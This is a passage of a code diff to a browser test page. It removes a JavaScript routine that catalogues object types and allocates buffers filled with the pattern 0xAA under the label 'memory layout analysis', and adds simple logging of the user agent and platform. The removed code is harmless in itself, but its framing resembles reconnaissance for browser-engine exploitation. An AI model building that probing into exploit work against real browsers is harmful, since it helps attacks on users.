-                    { type: 'Float', obj: 3.14159 },
-                    { type: 'String', obj: 'test string' },
-                    { type: 'LongString', obj: 'x'.repeat(1000) },
-                    { type: 'Array', obj: new Array(100) },
-                    { type: 'Object', obj: {a: 1, b: 2} },
-                    { type: 'Function', obj: function() {} },
-                    { type: 'ArrayBuffer', obj: new ArrayBuffer(1024) },
-                    { type: 'RegExp', obj: /pattern/gi }
-                ];
-                
-                testObjects.forEach((item, index) => {
-                    try {
-                        // Analyze object representation
-                        const objStr = Object.prototype.toString.call(item.obj);
-                        analysis.objectTypes[item.type] = {
-                            toString: objStr,
-                            constructor: item.obj.constructor?.name || 'unknown'
-                        };
-                        
-                        // Attempt to probe object internals
-                        if (item.obj instanceof ArrayBuffer) {
-                            analysis.objectTypes[item.type].byteLength = item.obj.byteLength;
-                        } else if (Array.isArray(item.obj)) {
-                            analysis.objectTypes[item.type].length = item.obj.length;
-                        }
-                        
-                        log(`🔍 ${item.type}: ${objStr}`, 'info');
-                        
-                    } catch (error) {
-                        log(`⚠️ Analysis failed for ${item.type}: ${error.message}`, 'warning');
-                    }
-                });
-                
-                // Memory allocation patterns
-                const allocSizes = [16, 64, 256, 1024, 4096, 16384];
-                allocSizes.forEach(size => {
-                    try {
-                        const buffer = new ArrayBuffer(size);
-                        const view = new Uint8Array(buffer);
-                        view.fill(0xAA);
-                        
-                        analysis.memoryRanges.push({
-                            size: size,
-                            allocated: true,
-                            pattern: 0xAA
-                        });
-                        
-                        log(`📊 Allocated ${size} byte buffer`, 'info');
-                        
-                    } catch (error) {
-                        log(`⚠️ Failed to allocate ${size} bytes: ${error.message}`, 'warning');
-                    }
-                });
-                
-                log("🗺️ Memory layout analysis completed", 'info');
-                log(`📊 Object types analyze
+            // Basic environment info
+            console.log('User Agent:', navigator.userAgent);
+            console.log('Platform:', navigator.platform);
+            console.log('JavaScript Engine:', typeof V8 !== 'undefined' ? 'V8' : 'Unknown');
+        };
+    </script>
+</body>
+</html>
